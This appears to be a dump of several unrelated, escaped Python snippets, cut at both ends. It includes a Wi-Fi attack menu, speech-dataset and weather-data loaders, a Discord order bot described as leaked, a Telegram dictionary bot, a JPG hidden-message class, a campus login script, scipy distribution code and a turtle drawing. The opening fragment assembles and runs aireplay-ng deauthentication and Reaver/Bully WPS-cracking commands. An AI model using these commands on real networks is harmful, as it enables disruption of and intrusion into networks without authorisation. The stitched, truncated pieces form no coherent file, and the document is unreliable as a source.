dist = int(input(\"\"))\n        order = \"airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}\".format(interface,bssid,channel,path,dist,bssid,interface)\n        geny = os.system(order)\n        intro()\n    elif var == 0 :\n    \n        cmd = os.system(\"clear\")\n        print(\"\"\"\nHi.\nThis is Our Team\n\"\"\")\n        quit()\n    elif var == 00:\n        exit()    \n        \n    elif var == 5:\n        cmd = os.system(\"clear\")\n        print(\"\"\"\n1)Reaver\n2)Bully\n3)wifite (Recommeneded)\n4)PixieWps\n5)wp3 \n0) Back to Main Menu\n\"\"\")\n        print(\"Choose the kind of the attack(External WIFI Adapter Require) ?\")\n        attack = int(input(\"\"))\n        if attack == 1:\n            print(\"\\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon))\")\n            interface = str(input(\"\"))\n            print(\"\\nEnter the bssid of the network ?\")\n            bssid = str(input(\"\"))\n            order = (\"reaver -i {} -b {} -vv\").format(interface,bssid)\n        ",
    "import glob\r\nimport os\r\nimport random\r\nfrom scipy import signal\r\nimport numpy\r\nimport soundfile\r\nimport torch\r\nimport torchaudio\r\nfrom torch.utils.data import Dataset\r\n\r\nclass CNCeleb2Dataset(Dataset):\r\n    def __init__(self, train_list, root_dir, num_frames, musan_path, rir_path, **kwargs):\r\n        \"\"\"\r\n        \u521d\u59cb\u5316\u6570\u636e\u96c6\r\n        :param train_list: \u5305\u542b\u8bad\u7ec3\u96c6\u4fe1\u606f\u7684\u6587\u672c\u6587\u4ef6\u8def\u5f84\r\n        :param root_dir: \u6570\u636e\u96c6\u7684\u6839\u76ee\u5f55\r\n        :param num_frames: \u6307\u5b9a\u7684\u5e27\u6570\r\n        :param musan_path: musan\u6570\u636e\u96c6\u7684\u76ee\u5f55 \u7528\u4e8e\u6570\u636e\u589e\u5f3a\r\n        :param rir_path: rir\u6df7\u54cd\u6570\u636e\u96c6\u7684\u76ee\u5f55 \u7528\u4e8e\u6570\u636e\u589e\u5f3a\r\n        \"\"\"\r\n        self.root_dir = root_dir\r\n        self.num_frames = num_frames\r\n\r\n        # Load and configure augmentation files\r\n        self.noisesnr = {'noise': [0, 15], 'speech': [13, 20], 'music': [5, 15]}\r\n        self.numnoise = {'noise': [1, 1], 'speech': [3, 8], 'music': [1, 1]}\r\n        # \u521d\u59cb\u5316\u5b57\u5178\u6765\u5b58\u50a8\u4e0d\u540c\u7c7b\u578b\u7684\u97f3\u9891\u6587\u4ef6\r\n        self.noiselist = {'noise': [], 'speech': [], 'music': []}\r\n        # \u8bfb\u53d6\u6240\u6709\u97f3\u9891\u6587\u4ef6\u7684\u8def\u5f84\r\n        augment_files = glob.glob(os.path.join(musan_path, '*/*/*.wav'))\r\n        # \u904d\u5386\u6240\u6709\u6587\u4ef6\uff0c\u5e76\u6839\u636e\u5b83\u4eec\u7684\u7c7b\u578b\u6dfb\u52a0\u5230\u76f8\u5e94\u7684\u5217\u8868\u4e2d\r\n        for file in augment_files:\r\n            # \u4ece\u6587\u4ef6\u8def\u5f84\u4e2d\u83b7\u53d6\u97f3\u9891\u7c7b\u578b\r\n            noise_type = file.split('/')[-3]\r\n            if noise_type in self.noiselist:\r\n                self.noiselist[noise_type].append(file)\r\n\r\n        # \u8bfb\u53d6\u6df7\u54cd\u97f3\u9891\u6587\u4ef6\u7528\u4e8e\u6570\u636e\u589e\u5f3a\r\n        self.rir_files = glob.glob(os.path.join(rir_path, '*/*/*.wav'))\r\n\r\n        # Load data & labels\r\n        self.data_list = []\r\n        self.data_label = []\r\n        lines = open(train_list).read().splitlines()\r\n        dictkeys = list(set([x.split()[0] for x in lines]))\r\n        dictkeys.sort()\r\n        dictkeys = {key: ii for ii, key in enumerate(dictkeys)}\r\n        for index, line in enumerate(lines):\r\n            speaker_label = dictkeys[line.split()[0]]\r\n            file_name = os.path.join(root_dir, line.split()[1])\r\n            self.data_label.append(speaker_label)\r\n            self.data_list.append(file_name)\r\n\r\n    def __len__(self):\r\n        \"\"\"\r\n        \u8fd4\u56de\u6570\u636e\u96c6\u4e2d\u6837\u672c\u7684\u6570\u91cf\r\n        \"\"\"\r\n        return len(self.data_list)\r\n\r\n    def __getitem__(self, idx):\r\n        \"\"\"\r\n        \u6839\u636e\u7d22\u5f15 idx \u83b7\u53d6\u4e00\u4e2a\u6837\u672c\r\n        :param idx: \u6837\u672c\u7684\u7d22\u5f15\r\n        \"\"\"\r\n        # Read the utterance and randomly select the segment\r\n        # Read the utterance and randomly select the segment\r\n        audio, sr = soundfile.read(self.data_list[idx])\r\n        length = self.num_frames * 160 + 240\r\n        if audio.shape[0] <= length:\r\n            shortage = length - audio.shape[0]\r\n            audio = numpy.pad(audio, (0, shortage), 'wrap')\r\n        start_frame = numpy.int64(random.random() * (audio.shape[0] - length))\r\n        audio = audio[start_frame:start_frame + length]\r\n        audio = numpy.stack([audio], axis=0)\r\n        # Data Augmentation\r\n        augtype = random.randint(0, 5)\r\n        if augtype == 0:  # Original\r\n            audio = audio\r\n        elif augtype == 1:  # Reverberation\r\n            audio = self.add_rev(audio)\r\n        elif augtype == 2:  # Babble\r\n            audio = self.add_noise(audio, 'speech')\r\n        elif augtype == 3:  # Music\r\n            audio = self.add_noise(audio, 'music')\r\n        elif augtype == 4:  # Noise\r\n            audio = self.add_noise(audio, 'noise')\r\n        elif augtype == 5:  # Television noise\r\n            audio = self.add_noise(audio, 'speech')\r\n            audio = self.add_noise(audio, 'music')\r\n        return torch.FloatTensor(audio[0]), self.data_label[idx]\r\n\r\n    def add_rev(self, audio):\r\n        rir_file = random.choice(self.rir_files)\r\n        rir, sr = soundfile.read(rir_file)\r\n        rir = numpy.expand_dims(rir.astype(numpy.float), 0)\r\n        rir = rir / numpy.sqrt(numpy.sum(rir ** 2))\r\n        return signal.convolve(audio, rir, mode='full')[:, :self.num_frames * 160 + 240]\r\n\r\n    def add_noise(self, audio, noisecat):\r\n        clean_db = 10 * numpy.log10(numpy.mean(audio ** 2) + 1e-4)\r\n        numnoise = self.numnoise[noisecat]\r\n        noiselist = random.sample(self.noiselist[noisecat], random.randint(numnoise[0], numnoise[1]))\r\n        noises = []\r\n        for noise in noiselist:\r\n            noiseaudio, sr = soundfile.read(noise)\r\n            length = self.num_frames * 160 + 240\r\n            if noiseaudio.shape[0] <= length:\r\n                shortage = length - noiseaudio.shape[0]\r\n                noiseaudio = numpy.pad(noiseaudio, (0, shortage), 'wrap')\r\n            start_frame = numpy.int64(random.random() * (noiseaudio.shape[0] - length))\r\n            noiseaudio = noiseaudio[start_frame:start_frame + length]\r\n            noiseaudio = numpy.stack([noiseaudio], axis=0)\r\n            noise_db = 10 * numpy.log10(numpy.mean(noiseaudio ** 2) + 1e-4)\r\n            noisesnr = random.uniform(self.noisesnr[noisecat][0], self.noisesnr[noisecat][1])\r\n            noises.append(numpy.sqrt(10 ** ((clean_db - noise_db - noisesnr) / 10)) * noiseaudio)\r\n        noise = numpy.sum(numpy.concatenate(noises, axis=0), axis=0, keepdims=True)\r\n        return noise + audio\r\n\r\n\r\nif __name__ == '__main__':\r\n    train_list = '/root/a",
    "import pygrib\nimport xarray as xr\nimport pandas as pd\n\ndef load_data(data):\n    \"\"\"\n    Load data from various formats (xarray DataArray, pandas DataFrame, NetCDF, GRIB, CSV, or Excel).\n    \n    Args:\n        data (xarray.DataArray, pandas.DataFrame, or str): The input data, either as an xarray DataArray, pandas DataFrame, or file path (NetCDF, GRIB, CSV, or Excel).\n    \n    Returns:\n        xarray.DataArray: The loaded data as an xarray DataArray.\n    \"\"\"\n    if isinstance(data, xr.DataArray):\n        return data\n    elif isinstance(data, pd.DataFrame):\n        return xr.DataArray(data)\n    elif isinstance(data, str):\n        if data.endswith('.nc'):\n            return xr.open_dataarray(data)\n        elif data.endswith('.grib') or data.endswith('.grb'):\n            return xr.open_dataarray(data, engine='cfgrib')\n        elif data.endswith('.csv'):\n            df = pd.read_csv(data)\n            return xr.DataArray(df)\n        elif data.endswith('.xlsx') or data.endswith('.xls'):\n            df = pd.read_excel(data)\n            return xr.DataArray(df)\n        else:\n            raise ValueError(f\"Unsupported file format: {data}\")\n    else:\n        raise ValueError(f\"Unsupported data type: {type(data)}\")",
    "import discord\r\nfrom discord.ext import commands\r\nimport requests\r\nimport json\r\nimport os\r\nfrom datetime import datetime\r\nfrom config import DISCORD_TOKEN, API_URL\r\nfrom colorama import Fore\r\n\r\nintents = discord.Intents.all()\r\n\r\nbot = commands.Bot(command_prefix='!', intents=intents)\r\n\r\nAPI_URL = API_URL\r\n\r\nDISCORD_TOKEN = DISCORD_TOKEN\r\n\r\n@bot.event\r\nasync def on_ready():\r\n    for _ in range(1000):\r\n        await bot.wait_until_ready()\r\n        print(\"This code is leaked in https://github.com/bbsitauah1337/smm-discord-panel-bot and credits to sociality.lol\")\r\n    \r\n    os.system('cls' if os.name == 'nt' else 'clear')\r\n    await bot.change_presence(activity=discord.Game(name=\"sociality.lol\", type=3))\r\n\r\n    print(f'Conectado como {bot.user.name}')\r\n\r\n    print(\"Credits for https://github.com/bbsitauah1337/smm-discord-panel-bot and sociality.lol\")\r\n\r\n    print(\"Available Commands:\")\r\n    for command in bot.commands:\r\n        print(f\"{Fore.GREEN} [{Fore.WHITE} + {Fore.GREEN}]{Fore.RESET}!{command.name}\")\r\n\r\nDATA_FILE = 'data.json'\r\n\r\nKEYS_FILE = 'keys.json'\r\n\r\ndef load_user_data():\r\n    try:\r\n        with open(DATA_FILE, 'r') as file:\r\n            return json.load(file)\r\n    except FileNotFoundError:\r\n        return {}\r\n\r\ndef save_user_data(user_data):\r\n    with open(DATA_FILE, 'w') as file:\r\n        json.dump(user_data, file)\r\n\r\ndef load_keys():\r\n    try:\r\n        with open(KEYS_FILE, 'r') as file:\r\n            keys_data = json.load(file)\r\n            return keys_data\r\n    except FileNotFoundError:\r\n        return {}\r\n    except json.JSONDecodeError:\r\n        return {}\r\n\r\ndef save_key(user_id, key):\r\n    keys = load_keys()\r\n    keys[user_id] = {'key': key, 'registration_time': str(datetime.now())}\r\n    with open(KEYS_FILE, 'w') as file:\r\n        json.dump(keys, file)\r\n\r\n@bot.command()\r\nasync def register_key(ctx, key):\r\n    save_key(str(ctx.author.id), key)\r\n    await ctx.send(\"Key registration successful!\")\r\n\r\n@bot.command()\r\nasync def info(ctx):\r\n    user_id = str(ctx.author.id)\r\n    keys = load_keys()\r\n    user_data = keys.get(user_id)\r\n\r\n    if user_data:\r\n        key = user_data['key']\r\n        registration_time = user_data['registration_time']\r\n    else:\r\n        registration_time = \"Not registered\"\r\n\r\n    embed = discord.Embed(\r\n        title=\"User Information\",\r\n        description=f\"User: {ctx.author.name}\\nUser ID: {user_id}\\nRegistration Time: {registration_time}\\nKey: ||xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx||\",\r\n        color=discord.Color.blue()\r\n    )\r\n    await ctx.send(embed=embed)\r\n\r\n    if user_data:\r\n        dm_embed = discord.Embed(\r\n            title=\"Your Registration Information\",\r\n            description=f\"User ID: {user_id}\\nRegistration Time: {registration_time}\\nKey: ||{key}||\",\r\n            color=discord.Color.blue()\r\n        )\r\n        await ctx.author.send(embed=dm_embed)\r\n\r\n@bot.command()\r\nasync def add_order(ctx, service_id, link, quantity):\r\n    user_id = str(ctx.author.id)\r\n    keys = load_keys()\r\n    if user_id not in keys:\r\n        await ctx.send(\"You need to register your key first using !register_key <key>\")\r\n        return\r\n    key = keys[user_id]\r\n\r\n    payload = {\r\n        'key': key,\r\n        'action': 'add',\r\n        'service': service_id,\r\n        'link': link,\r\n        'quantity': quantity\r\n    }\r\n\r\n    response = requests.post(API_URL, data=payload)\r\n\r\n    if response.status_code == 200:\r\n        data = response.json()\r\n        order_id = data.get('order')\r\n\r\n        status_payload = {\r\n            'key': key,\r\n            'action': 'status',\r\n            'order': order_id\r\n        }\r\n        status_response = requests.post(API_URL, data=status_payload)\r\n        if status_response.status_code == 200:\r\n            status_data = status_response.json()\r\n            charge = status_data.get('charge')\r\n            currency = status_data.get('currency')\r\n        else:\r\n            charge = \"N/A\"\r\n            currency = \"N/A\"\r\n\r\n        user_profile = {\r\n            'username': ctx.author.name,\r\n            'user_id': str(ctx.author.id),\r\n            'link': link,\r\n            'price': charge,\r\n            'currency': currency,\r\n            'quantity': quantity\r\n        }\r\n\r\n        user_data = load_user_data()\r\n\r\n        user_data[order_id] = user_profile\r\n\r\n        save_user_data(user_data)\r\n\r\n        await ctx.send(f\"Order successfully placed! Order ID: {order_id}\")\r\n\r\n    else:\r\n        await ctx.send(\"Failed to add order. Please try again later.\")\r\n\r\n@bot.command()\r\nasync def stats(ctx):\r\n    user_data = load_user_data()\r\n\r\n    canceled = 0\r\n    delivered = 0\r\n    in_progress = 0\r\n    order_ids = []\r\n\r\n    for order_id, profile in user_data.items():\r\n        order_ids.append(order_id)\r\n        if int(order_id) % 2 == 0:\r\n            delivered += 1\r\n        else:\r\n            in_progress += 1\r\n\r\n    total_orders = canceled + delivered + in_progress\r\n\r\n    stats_message = f\"Total Orders: {total_orders}\\n\"\r\n    stats_message += f\"Canceled Orders: {canceled}\\n\"\r\n    stats_m",
    "import os\nimport dictionary\nfrom pyrogram import Client, filters\nfrom pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton\n\n\nBot = Client(\n    \"Dictionary Bot\",\n    bot_token=os.environ.get(\"BOT_TOKEN\"),\n    api_id=int(os.environ.get(\"API_ID\")),\n    api_hash=os.environ.get(\"API_HASH\")\n)\n\nSTART_TEXT = \"\"\"Hello {},\n\nI am simple Telegram Words Dictionary Bot. \\\nI can provide you the meaning of any word.\"\"\"\n\nHELP_TEXT = \"\"\"--**More Help**--\n\n- Just send a word to get the meaning of it.\n- I will provide you the meaning of the word.\n\n- You can also use me in groups using /dict command\n  eg:- `/dict Hello`\n- or, Send a word and reply /dict\n- I will provide you the meaning of the word.\n\"\"\"\n\nABOUT_TEXT = \"\"\"--**About Me**--\n\n- **Bot :** `Dictionary Bot`\n- **Developer :**\n  \u2022 [GitHub](https://github.com/FayasNoushad)\n  \u2022 [Telegram](https://telegram.me/FayasNoushad)\n- **Source :** [Click here](https://github.com/FayasNoushad/Telegram-Dictionary-Bot)\n- **Language :** [Python3](https://python.org)\n- **Library :** [Pyrogram](https://pyrogram.org)\"\"\"\n\nSTART_BUTTONS = InlineKeyboardMarkup(\n    [\n        [\n            InlineKeyboardButton('Feedback', url='https://telegram.me/FayasNoushad')\n        ],\n        [\n            InlineKeyboardButton('Help', callback_data='help'),\n            InlineKeyboardButton('About', callback_data='about'),\n            InlineKeyboardButton('Close', callback_data='close')\n        ]\n    ]\n)\n\nHELP_BUTTONS = InlineKeyboardMarkup(\n    [\n        [\n            InlineKeyboardButton('Home', callback_data='home'),\n            InlineKeyboardButton('About', callback_data='about'),\n            InlineKeyboardButton('Close', callback_data='close')\n        ]\n    ]\n)\n\nABOUT_BUTTONS = InlineKeyboardMarkup(\n    [\n        [\n            InlineKeyboardButton('Home', callback_data='home'),\n            InlineKeyboardButton('Help', callback_data='help'),\n            InlineKeyboardButton('Close', callback_data='close')\n        ]\n    ]\n)\n\n\n@Bot.on_callback_query()\nasync def cb_data(bot, message):\n    \n    if message.data == \"home\":\n        await message.message.edit_text(\n            text=START_TEXT.format(message.from_user.mention),\n            disable_web_page_preview=True,\n            reply_markup=START_BUTTONS\n        )\n    \n    elif message.data == \"help\":\n        await message.message.edit_text(\n            text=HELP_TEXT,\n            disable_web_page_preview=True,\n            reply_markup=HELP_BUTTONS\n        )\n    \n    elif message.data == \"about\":\n        await message.message.edit_text(\n            text=ABOUT_TEXT,\n            disable_web_page_preview=True,\n            reply_markup=ABOUT_BUTTONS\n        )\n    \n    else:\n        await message.message.delete()\n    \n\n@Bot.on_message(filters.private & filters.command([\"start\"]))\nasync def sed_start_message(bot, message):\n    \n    await message.reply_text(\n        text=START_TEXT.format(message.from_user.mention),\n        disable_web_page_preview=True,\n        quote=True,\n        reply_markup=START_BUTTONS\n    )\n\n\n@Bot.on_message(filters.private & filters.command([\"help\"]))\nasync def send_help(bot, message):\n    \n    await message.reply_text(\n        text=HELP_TEXT,\n        disable_web_page_preview=True,\n        quote=True,\n        reply_markup=HELP_BUTTONS\n    )\n\n\n@Bot.on_message(filters.private & filters.command([\"about\"]))\nasync def send_about(bot, message):\n    \n    await message.reply_text(\n        text=ABOUT_TEXT,\n        disable_web_page_preview=True,\n        quote=True,\n        reply_markup=ABOUT_BUTTONS\n    )\n\n\n@Bot.on_message(filters.command([\"dict\", \"dictionary\", \"word\"]))\nasync def cmd_filter_dictionary(_, message):\n    m = await message.reply_text(\n        text=\"Searching...\",\n        quote=True\n    )\n    if (len(message.text.split(\" \")) == 1):\n        if (message.reply_to_message) and (message.reply_to_message.text):\n            word = message.reply_to_message.text\n        else:\n            await m.edit_text(\n                text=\"Reply to a text message containing the word.\",\n                disable_web_page_preview=True\n            )\n            return\n    else:\n        word = message.text.split(\" \", 1)[1]\n    details = dictionary.dictionary(word)\n    await m.edit_text(\n        text=details,\n        disable_web_page_preview=True\n    )\n\n\n@Bot.on_message(filters.private & filters.text)\nasync def send_dictionary_details(_, message):\n    m = await message.reply_text(\n        text=\"Searching...\",\n        quote=True\n    )\n    word = message.text\n    details = dictionary.dictionary(word)\n    await m.edit_text(\n        text=details,\n        disable_web_page_preview=True\n    )\n\n\nBot.run()\n",
    "# -*- coding: utf-8 -*-\n# Author: Cypherr\n\n\n# Define the start and end bytes for the JPG file format\nSTART_BYTES = ['FF', 'D8', 'FF', 'E0']\nEND_BYTES = ['FF', 'D9']\n\n\nclass JPGHiddenMessager(object):\n    def __init__(self, image: str):\n        self._image = image\n\n    def write(self, message):\n        # Open the image file in append binary mode\n        with open(self._image, \"ab\") as f:\n            # Write the message to the file in UTF-8 encoding\n            f.write(message.encode('utf-8'))\n\n    def read(self):\n        # Open the image file in read binary mode\n        with open(self._image, \"rb\") as f:\n            # Read the entire content of the file\n            content = f.read()\n\n            # Check if the file starts with the expected start bytes\n            assert 0 == content.index(bytes.fromhex(\n                \"\".join(START_BYTES))), \"Error in JPG format.\"\n\n            # Find the offset of the end bytes\n            offset = content.index(bytes.fromhex(\"\".join(END_BYTES)))\n\n            # Move the file pointer to the position after the end bytes\n            f.seek(offset+2)\n\n            # Read and return the remaining content\n            return f.read()\n\n    def format(self):\n        try:\n            # Open the image file in read binary mode\n            with open(self._image, \"rb\") as file:\n                # Read the entire content of the file\n                content = file.read()\n\n                # Find the offset of the end bytes\n                offset = content.index(bytes.fromhex(\"\".join(END_BYTES)))\n\n                # Extract the content up to and including the end bytes\n                updated_content = content[:offset+2]\n\n            # Reopen the image file in write binary mode\n            with open(self._image, \"wb\") as file:\n                # Write the updated content back to the file\n                file.write(updated_content)\n\n            # Return True to indicate successful formatting\n            return True\n        except:\n            # Return False if an exception occurs during formatting\n            return False\n",
    "import requests\nfrom urllib.parse import quote\nimport time\nimport smtplib\nfrom email.mime.text import MIMEText\n\n\ndef smtp(to_addr,from_addr,from_password):\n    msg = MIMEText('start!','plain','utf-8')\n    msg['From'] = from_addr\n    msg['to'] = to_addr\n    msg['Subject'] = \"Start!\"\n\n    if 'qq' in from_addr:\n        smtpObj = smtplib.SMTP_SSL('smtp.qq.com',465)\n    elif '163' in from_addr:\n        smtpObj = smtplib.SMTP_SSL('smtp.163.com', 465)\n    else:\n        print('\u8bf7\u6b63\u786e\u8f93\u5165\u7528\u4e8e\u53d1\u9001\u90ae\u4ef6\u7684QQ\u6216163\u90ae\u7bb1\uff01')\n        input()\n        exit(0)\n\n    smtpObj.login(from_addr,from_password)\n    smtpObj.sendmail(from_addr,to_addr,msg.as_string())\n    smtpObj.quit()\n\nwith open('info.txt','r',encoding=\"utf-8\") as f:\n    data = f.read().splitlines()\nwhile '' in data:\n    data.remove('')\nif len(data) == 4:\n    userId,password,service,cookies_url = data\n    is_seed = False\nelif len(data) == 7:\n    userId, password, service, cookies_url, f_addr, f_password, t_addr = data\n    is_seed =True\nelse:\n    print('\u8bf7\u6b63\u786e\u8bbe\u7f6einfo.txt\u6587\u4ef6')\n    input()\n    exit(0)\n\nqueryString =cookies_url.split('?')[1]\nqueryString = quote(queryString)\nservice = quote(service)\nlogin_url = 'https://auth.ysu.edu.cn:8443/eportal/InterFace.do?method=login'\nUser_Agent ='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'\nlogin_data = {'userId':userId, 'password':password, 'service':service, 'queryString':queryString, 'operatorPwd':'','operatorUserId':'','validcode':'', 'passwordEncrypt':'false'}\nlogin_response = requests.post(login_url,data=login_data,headers={'User-Agent':User_Agent})\n\ntime.sleep(10)\ncode = requests.get('https://www.baidu.com').status_code\nif code == 200:\n    print('\u8fde\u63a5\u6210\u529f\uff01')\nelse:\n    print('\u6ca1\u6709\u8fde\u63a5\u6210\u529f\uff0c\u8bf7\u8be6\u7ec6\u68c0\u67e5\uff01')\nif is_seed:\n    smtp(t_addr,f_addr,f_password)\n    print('\u90ae\u4ef6\u5df2\u53d1\u9001\uff01')\nprint('5\u79d2\u540e\u81ea\u52a8\u5173\u95ed\u7a97\u53e3\uff01')\ntime.sleep(5)\n\n\n",
    "#\n# Author: Joris Vankerschaver 2013\n#\nimport math\nimport numpy as np\nfrom numpy import asarray_chkfinite, asarray\nfrom numpy.lib import NumpyVersion\nimport scipy.linalg\nfrom scipy._lib import doccer\nfrom scipy.special import gammaln, psi, multigammaln, xlogy, entr, betaln\nfrom scipy._lib._util import check_random_state\nfrom scipy.linalg.blas import drot\nfrom scipy.linalg._misc import LinAlgError\nfrom scipy.linalg.lapack import get_lapack_funcs\n\nfrom ._discrete_distns import binom\nfrom . import _mvn, _covariance, _rcont\n\n__all__ = ['multivariate_normal',\n           'matrix_normal',\n           'dirichlet',\n           'wishart',\n           'invwishart',\n           'multinomial',\n           'special_ortho_group',\n           'ortho_group',\n           'random_correlation',\n           'unitary_group',\n           'multivariate_t',\n           'multivariate_hypergeom',\n           'random_table',\n           'uniform_direction']\n\n_LOG_2PI = np.log(2 * np.pi)\n_LOG_2 = np.log(2)\n_LOG_PI = np.log(np.pi)\n\n\n_doc_random_state = \"\"\"\\\nseed : {None, int, np.random.RandomState, np.random.Generator}, optional\n    Used for drawing random variates.\n    If `seed` is `None`, the `~np.random.RandomState` singleton is used.\n    If `seed` is an int, a new ``RandomState`` instance is used, seeded\n    with seed.\n    If `seed` is already a ``RandomState`` or ``Generator`` instance,\n    then that object is used.\n    Default is `None`.\n\"\"\"\n\n\ndef _squeeze_output(out):\n    \"\"\"\n    Remove single-dimensional entries from array and convert to scalar,\n    if necessary.\n    \"\"\"\n    out = out.squeeze()\n    if out.ndim == 0:\n        out = out[()]\n    return out\n\n\ndef _eigvalsh_to_eps(spectrum, cond=None, rcond=None):\n    \"\"\"Determine which eigenvalues are \"small\" given the spectrum.\n\n    This is for compatibility across various linear algebra functions\n    that should agree about whether or not a Hermitian matrix is numerically\n    singular and what is its numerical matrix rank.\n    This is designed to be compatible with scipy.linalg.pinvh.\n\n    Parameters\n    ----------\n    spectrum : 1d ndarray\n        Array of eigenvalues of a Hermitian matrix.\n    cond, rcond : float, optional\n        Cutoff for small eigenvalues.\n        Singular values smaller than rcond * largest_eigenvalue are\n        considered zero.\n        If None or -1, suitable machine precision is used.\n\n    Returns\n    -------\n    eps : float\n        Magnitude cutoff for numerical negligibility.\n\n    \"\"\"\n    if rcond is not None:\n        cond = rcond\n    if cond in [None, -1]:\n        t = spectrum.dtype.char.lower()\n        factor = {'f': 1E3, 'd': 1E6}\n        cond = factor[t] * np.finfo(t).eps\n    eps = cond * np.max(abs(spectrum))\n    return eps\n\n\ndef _pinv_1d(v, eps=1e-5):\n    \"\"\"A helper function for computing the pseudoinverse.\n\n    Parameters\n    ----------\n    v : iterable of numbers\n        This may be thought of as a vector of eigenvalues or singular values.\n    eps : float\n        Values with magnitude no greater than eps are considered negligible.\n\n    Returns\n    -------\n    v_pinv : 1d float ndarray\n        A vector of pseudo-inverted numbers.\n\n    \"\"\"\n    return np.array([0 if abs(x) <= eps else 1/x for x in v], dtype=float)\n\n\nclass _PSD:\n    \"\"\"\n    Compute coordinated functions of a symmetric positive semidefinite matrix.\n\n    This class addresses two issues.  Firstly it allows the pseudoinverse,\n    the logarithm of the pseudo-determinant, and the rank of the matrix\n    to be computed using one call to eigh instead of three.\n    Secondly it allows these functions to be computed in a way\n    that gives mutually compatible results.\n    All of the functions are computed with a common understanding as to\n    which of the eigenvalues are to be considered negligibly small.\n    The functions are designed to coordinate with scipy.linalg.pinvh()\n    but not necessarily with np.linalg.det() or with np.linalg.matrix_rank().\n\n    Parameters\n    ----------\n    M : array_like\n        Symmetric positive semidefinite matrix (2-D).\n    cond, rcond : float, optional\n        Cutoff for small eigenvalues.\n        Singular values smaller than rcond * largest_eigenvalue are\n        considered zero.\n        If None or -1, suitable machine precision is used.\n    lower : bool, optional\n        Whether the pertinent array data is taken from the lower\n        or upper triangle of M. (Default: lower)\n    check_finite : bool, optional\n        Whether to check that the input matrices contain only finite\n        numbers. Disabling may give a performance gain, but may result\n        in problems (crashes, non-termination) if the inputs do contain\n        infinities or NaNs.\n    allow_singular : bool, optional\n        Whether to allow a singular matrix.  (Default: True)\n\n    Notes\n    -----\n    The arguments are similar to those of scipy.linalg.pinvh().\n\n    \"\"\"\n\n    def __init__(self, M, cond=None, rcond=None, lower=True,\n                 check_finite=True, allow_singular=True):\n        self._M = np",
    "import turtle\n\nc = turtle.Turtle()\nc.pensize(10)\nc.speed(0)\n#name\nc.penup()\nc.goto(-200,600)\nc.pendown()\nc.color(\"limegreen\")\nstyle = (\"Ariel\",30,\"italic\")\nc.write(\"Garry\", font = style, move = True )\n#shell\nc.penup()\nc.goto(-300,-300)\nc.lt(120)\nc.pendown()\nc.color(\"pink\")\nc.begin_fill()\nc.pencolor(\"black\")\nc.circle(-700,20)\nc.circle(-280,80)\nc.circle(-220,80)\nc.circle(-400,30)\nc.circle(-450,30)\nc.lt(120)\nc.circle(-100,30)\nc.circle(-25,70)\nc.rt(70)\nc.fd(95)\nc.lt(35)\nc.circle(-150,50)\nc.circle(-90,30)\nc.rt(20)\nc.circle(60,30)\nc.circle(170,50)\nc.rt(50)\nc.circle(-20,150)\nc.end_fill()\n#body\nc.penup()\nc.goto(100,60)\nc.rt(180)\nc.pendown()\nc.color(\"#66CDAA\")\nc.begin_fill()\nc.pencolor(\"black\")\nc.lt(120)\nc.circle(-460,50)\nc.rt(80)\nc.circle(428,20)\nc.lt(30)\nc.circle(-150,50)\nc.circle(-90,30)\nc.rt(18)\nc.circle(60,30)\nc.circle(175,50)\nc.rt(40)\nc.circle(60,40)\nc.circle(22,45)\nc.lt(35)\nc.circle(22,40)\nc.lt(10)\nc.circle(50,40)\nc.rt(65)\nc.circle(100,40)\nc.circle(35,50)\nc.rt(90)\nc.circle(70,80)\nc.circle(-60,30)\nc.rt(70)\nc.circle(20,65)\nc.circle(300,20)\nc.lt(120)\nc.circle(-50,20)\nc.rt(170)\nc.circle(80,30)\nc.circle(40,20)\nc.circle(400,20)\nc.rt(80)\nc.circle(40,30)\nc.circle(40,35)\nc.circle(170,30)\nc.rt(90)\nc.circle(40,60)\nc.circle(80,60)\nc.lt(120)\nc.circle(-50,60)\nc.circle(40,20)\nc.circle(120,50)\nc.rt(85)\nc.circle(-2400,10)\nc.lt(100)\nc.fd(70)\nc.end_fill()\n#eye\nc.penup()\nc.goto(100,60)\nc.rt(20)\nc.pendown()\nc.color(\"#ADFF2F\")\nc.begin_fill()\nc.pencolor(\"black\")\nc.circle(-90)\nc.end_fill()\n#righteyebody\nc.penup()\nc.goto(270,-320)\nc.rt(97)\nc.pendown()\nc.color(\"#66CDAA\")\nc.begin_fill()\nc.pencolor(\"black\")\nc.circle(2400,10)\nc.rt(85)\nc.fd(65)\nc.rt(113)\nc.circle(1248,20)\nc.rt(117)\nc.circle(80,30)\nc.end_fill()\n#eye\nc.penup()\nc.goto(290,75)\nc.rt(40)\nc.pendown()\nc.color(\"#ADFF2F\")\nc.begin_fill()\nc.pencolor(\"black\")\nc.circle(-90)\nc.end_fill()\n#kekd\nc.penup()\nc.goto(350,-350)\nc.lt(50)\nc.pendown()\nc.color(\"#ADFF2F\")\nc.begin_fill()\nc.pencolor(\"#ADFF2F\")\nc.pensize(5)\nc.circle(-1280,30)\nc.lt(40)\nc.rt(38)\nc.circle(60,40)\nc.circle(22,45)\nc.lt(35)\nc.circle(22,40)\nc.lt(10)\nc.circle(50,40)\nc.rt(65)\nc.circle(100,40)\nc.circle(35,50)\nc.rt(90)\nc.circle(70,80)\nc.circle(-60,30)\nc.rt(70)\nc.circle(20,65)\nc.circle(300,20)\nc.lt(120)\nc.circle(-50,20)\nc.rt(170)\nc.circle(80,30)\nc.circle(40,20)\nc.circle(400,20)\nc.rt(80)\nc.circle(40,30)\nc.circle(40,35)\nc.circle(170,30)\nc.rt(90)\nc.circle(40,60)\nc.circle(80,60)\nc.lt(120)\nc.circle(-50,60)\nc.circle(20,20)\nc.lt(50)\nc.fd(10)\nc.end_fill()\n#extrablack\nc.penup()\nc.goto(-320,-350)\nc.rt(25)\nc.pendown()\nc.pensize(10)\nc.pencolor(\"black\")\nc.circle(60,40)\nc.circle(22,45)\nc.lt(35)\nc.circle(22,40)\nc.lt(10)\nc.circle(50,40)\nc.rt(65)\nc.circle(100,40)\nc.circle(35,50)\nc.rt(90)\nc.circle(70,80)\nc.circle(-60,30)\nc.rt(70)\nc.circle(20,65)\nc.circle(300,20)\nc.lt(120)\nc.circle(-50,20)\nc.rt(170)\nc.circle(80,30)\nc.circle(40,20)\nc.circle(400,20)\nc.rt(80)\